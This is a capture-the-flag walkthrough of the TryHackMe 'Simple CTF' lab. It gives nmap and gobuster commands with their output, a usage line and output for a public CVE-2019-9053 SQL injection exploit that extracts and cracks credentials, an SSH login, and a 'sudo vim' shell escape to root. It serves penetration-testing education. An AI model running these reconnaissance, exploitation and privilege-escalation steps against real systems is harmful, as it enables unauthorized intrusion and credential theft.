---
title: TryHackMe Simple CTF
date: 2024-03-10 00:00:00 +0800
categories: [TryHackMe]
tags: [walkthough,write-ups]     # TAG names should always be lowercase
image:
    path: https://tryhackme-images.s3.amazonaws.com/room-icons/f28ade2b51eb7aeeac91002d41f29c47.png
---

A beginner level CTF. Know how to use nmap, directory busting, network service exploitation, searching CMS public exploit and linux privilege escalation.

## **Reconnaissance**
Initially do the Nmap scan.
```bash
nmap -sC -sV -p- $TARGET_IP --open
```
`-sV`: Enables version detection, which attempts to determine the version of services running on open ports.

`-sC`: Enables default script scanning, executing a set of scripts to discover additional information and potential vulnerabilities.

`-p-`: Scans all 65,535 TCP ports, allowing for thorough port enumeration.

`TARGET_IP`: Specifies the target IP address.

`--open`: Shows only open ports in the output, filtering out closed and filtered ports.


```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-08 06:37 EST
Nmap scan report for 10.10.157.97
Host is up (0.30s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.50.82
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 394.01 seconds
```
Based on the Nmap scan results, the target system has two open ports with the following services.
- Port 21/tcp: vsftpd 3.0.3
- Port 2222/tcp: OpenSSH 7.2p2 running on Ubuntu Linux.
- Port 80/tcp: Apache HTTP Server 2.4.18 running on Ubuntu.

## **Insights**
---
- 80 HTTP
    - We have found a directory /simple that has a CMS
    - Search for a possible default login credentials
    - Found a CMS Version (CMS Made Simple version 2.2.8)
    - Search for a possible version vulnerability

- 21 FTP
    - vsftpd 3.0.3
    - We have FTP Anonymous login. We didn’t tried this one!

- 2222 SSH
    - We need some credentials to access this and bruteforcing can take a really long time before the credentials can be cracked. Hence, this is the least of our priorities for pentesting.
    - Found some credentials.

## **Enumeration**
---
### 80 HTTP
Based from our Nmap scan, it looks like port 80 only shows the Apache default page.

![Desktop View](/assets/images/simple-ctf/def-page.png){: width="972" height="589" }

Let us try scanning for other directories using gobuster. We also can’t do pretty much here.

```bash
gobuster dir -u http://10.10.157.97 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30
```

```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/simple               (Status: 301) [Size: 313] [--> http://10.10.157.97/simple/]
/server-status        (Status: 403) [Size: 300]
```

It looks like we have a redirect page. We can inspect that and look for more information


![Desktop View](/assets/images/simple-ctf/simple.png){: width="972" height="589" }

All right! We have a Content Management System (CMS), we can try inspecting source code and see if we can find something interesting.

![Desktop View](/assets/images/simple-ctf/source-code.png){: width="972" height="589" }

The version of the CMS mentioned is `2.2.8`, which suggests that this is the specific release of the software that the website is using. This means we can search in "google" or others like `[service_name]` `[version]` exploit

Fortunately, someone posted an updated CMS exploit on their github: [kriss-u/cmsmadesimple-exploit.py](https://gist.github.com/kriss-u/321f0418778697e2ec919f04664ceb4b)


This script is an exploit for an unauthenticated SQL injection vulnerability in CMS Made Simple versions up to 2.2.9, identified by [CVE-2019-9053](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9053). The exploit performs a time-based SQL injection to extract sensitive information from the vulnerable web application

The script brute-forces the `username`, `email`, and `password` by sequentially guessing their values and observing the response time to determine when a guess is correct.

If the `--crack` option is used, the script attempts to crack the hashed password by hashing each word in the provided wordlist with the previously extracted salt and comparing it against the extracted hashed password.


```bash
python3 exploit.py -u http://target-uri --crack -w /path-wordlist
```

Using the exploit we have found

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```


## **Gaining an Initial Foothold**

Now that we have a username and a password. How about using these credentials to log in via SSH running on port 2222.

```bash
ssh mitch@<TARGET_IP>> -p 2222
```
![Desktop View](/assets/images/simple-ctf/ssh.png){: width="972" height="589" }

Now we got the shell, let us look for the flag

```bash
/home/mitch/user.txt
```

Let us also look for another user!

![Desktop View](/assets/images/simple-ctf/user2.png){: width="972" height="589" }

## **Privilege Escalation**

I initially checked `sudo -l` command to list the permissions granted to the current user in the sudoers file.

We found that granting a user, such as `"mitch"`, has the ability to run Vim as root without a password, as specified by `(root) NOPASSWD: /usr/bin/vim` in the sudoers configuration. This privilege effectively elevates "mitch" to have root-level access for the scope of actions performable within Vim, bypassing standard security protocols that require authentication for such elevated privileges.

![Desktop View](/assets/images/simple-ctf/sudo-priv.png){: width="972" height="589" }

We can use [gtfobin](https://gtfobins.github.io/gtfobins/vim/#sudo) for privilege escalation.

```
sudo vim -c ':!/bin/sh'
```
![Desktop View](/assets/images/simple-ctf/pwned.png){: width="972" height="589" }



## TAKE AWAY CONCEPTS
- Learn how the exploit works. There are instances where the code might not work you expected it to be.